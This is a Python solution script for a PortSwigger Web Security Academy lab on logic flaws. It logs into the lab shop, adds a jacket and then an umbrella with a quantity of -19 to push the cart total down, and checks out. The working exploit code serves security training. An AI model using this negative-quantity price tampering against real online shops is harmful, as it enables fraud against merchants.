#!/usr/bin/env python


'''This lab doesn't adequately validate user input. You can exploit a logic flaw in its purchasing workflow to buy items for an unintended price. To solve the lab, buy a "Lightweight l33t leather jacket".

You can log in to your own account using the following credentials: wiener:peter

Lab Link: https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-high-level
'''

# The goal for this exercise is to manipulate the item quantities so that we can buy the jacket for under 100 dollars. Accomplished by:
# Set Jacket (productid 1) qty to 1
# Set Umbrella (productid 4) qty to -19

import requests
from bs4 import BeautifulSoup
from urllib.parse import urlparse, parse_qs


s = requests.session()
lab_id = '0a150009048788d380198fb3009a0015' #change based on generated lab


def token_extract(resp): # function for parsing the csrf token when needed
    soup = BeautifulSoup(resp, 'lxml')
    return soup.find('input', {'name': 'csrf'})['value']


# First we need to login as wiener:peter as provided in the instructions
uri = f"https://{lab_id}.web-security-academy.net/login"
r = s.get(uri) 
token = token_extract(r.text) # login csrf token

# Submit this data in next the post request to login
data = { 'username' : "wiener",
        'password' : "peter",
        'csrf': token
}
r2 = s.post(uri, data=data)

# Post the jacket to our cart 
uri = f"https://{lab_id}.web-security-academy.net/cart"
data = {"productId": "1", "redir": "PRODUCT", "quantity": "1"} 
r3 = s.post(uri, data=data)

# Not post the umbrella to our cart with the tampered quality
data = {"productId": "4", "redir": "PRODUCT", "quantity": "-19"} 
r4 = s.post(uri, data=data)

# Complete the order to solve the lab
# We need the csrf token from the cart page
r5 = s.get(uri)
token = token_extract(r5.text) #cart csrf token

# Use the csrf token to checkout our jacket purchase
uri = f"https://{lab_id}.web-security-academy.net/cart/checkout"
data = { "csrf": token }
r6 = s.post(uri, data=data)
if 'solved' in r6.text:
    print('solved')
else:
    print('nope')




